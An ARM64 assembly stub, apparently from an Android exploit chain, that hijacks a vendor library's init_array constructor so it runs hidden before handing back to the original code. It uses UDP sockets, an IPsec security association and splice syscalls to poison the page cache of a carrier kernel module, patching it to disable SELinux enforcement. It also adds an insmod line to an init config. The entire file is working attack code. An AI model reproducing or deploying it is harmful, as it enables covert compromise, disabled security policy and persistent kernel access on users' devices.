// libeva init_array ctor stub (hal_tracking_default). Poisons TWO vendor page caches via the
// shell-staged IpSec SA, using DIRECT adr addressing for each path/table (proven V1 style).
//   file0 = carrier .ko  -> carrier_patched.ko (enforcing=0)
//   file1 = init.insmod.cfg -> +insmod line
// Placed at libeva 0x478e4; init_array[0] redirected here (RELR slot). bti c entry; tail-call
// original ctor 0x4139c. Counts (cnt0/cnt1) and sockaddr port patched by build_any.py.

.section .stub,"ax"
.globl _stub
_stub:
    bti     c
    sub     sp, sp, #112
    stp     x19, x20, [sp, #32]
    stp     x21, x22, [sp, #48]
    stp     x23, x24, [sp, #64]
    str     x30, [sp, #24]          // save init_array-runner return for the tail-call
    // hdr spi+seq
    adr     x0, spihdr
    ldr     x0, [x0]
    str     x0, [sp, #0]
    // sockfd = socket(AF_INET,SOCK_DGRAM,0)
    mov     w0, #2
    mov     w1, #2
    mov     w2, wzr
    mov     x8, #198
    svc     #0
    mov     x20, x0
    // connect(sockfd, sockaddr, 16)
    mov     x0, x20
    adr     x1, sockaddr
    mov     w2, #16
    mov     x8, #203
    svc     #0

    // ---- file0: carrier ----
    mov     x0, #-100
    adr     x1, path0
    mov     w2, wzr
    mov     w3, wzr
    mov     x8, #56
    svc     #0
    mov     x19, x0
    adr     x21, table0
    adr     x0, cnt0
    ldr     w22, [x0]
    bl      sendloop
    mov     x0, x19
    mov     x8, #57
    svc     #0

    // ---- file1: cfg ----
    mov     x0, #-100
    adr     x1, path1
    mov     w2, wzr
    mov     w3, wzr
    mov     x8, #56
    svc     #0
    mov     x19, x0
    adr     x21, table1
    adr     x0, cnt1
    ldr     w22, [x0]
    bl      sendloop
    mov     x0, x19
    mov     x8, #57
    svc     #0

    ldr     x30, [sp, #24]          // restore init_array-runner return
    ldp     x19, x20, [sp, #32]
    ldp     x21, x22, [sp, #48]
    ldp     x23, x24, [sp, #64]
    add     sp, sp, #112
tailcall:
    .word   0                       // patched -> b 0x4139c

// sendloop: x19=fd, x21=table ptr, w22=count. Clobbers x0-x8. Uses x23 (saved). x30 via bl.
sendloop:
    mov     x23, x30                // save return (bl clobbered x30; no nested bl)
sl_loop:
    ldr     w0, [x21]
    str     x0, [sp, #16]
    ldur    x1, [x21, #4]
    str     x1, [sp, #8]
    mov     x0, x20
    mov     x1, sp
    mov     w2, #16
    mov     w3, #0x8000
    mov     x4, xzr
    mov     x5, xzr
    mov     x8, #206
    svc     #0
    mov     x0, x20
    mov     x1, x19
    add     x2, sp, #16
    mov     w3, #17
    mov     x8, #71
    svc     #0
    mov     x0, x20
    mov     x1, xzr
    mov     w2, wzr
    mov     w3, wzr
    mov     x4, xzr
    mov     x5, xzr
    mov     x8, #206
    svc     #0
    add     x21, x21, #12
    subs    w22, w22, #1
    b.ne    sl_loop
    ret     x23

.balign 8
spihdr:
    .byte 0xde,0xad,0xbe,0x10, 0x00,0x00,0x00,0x01
sockaddr:
    .byte 0x02,0x00
    .byte 0x00,0x00
    .byte 0x7f,0x00,0x00,0x01
    .byte 0,0,0,0,0,0,0,0
cnt0:   .word 48
cnt1:   .word 55
path0:
    .asciz "@CARRIER_PATH@"
path1:
    .asciz "@CFG_PATH@"
.balign 4
table0:
    .space 576
table1:
    .space 660
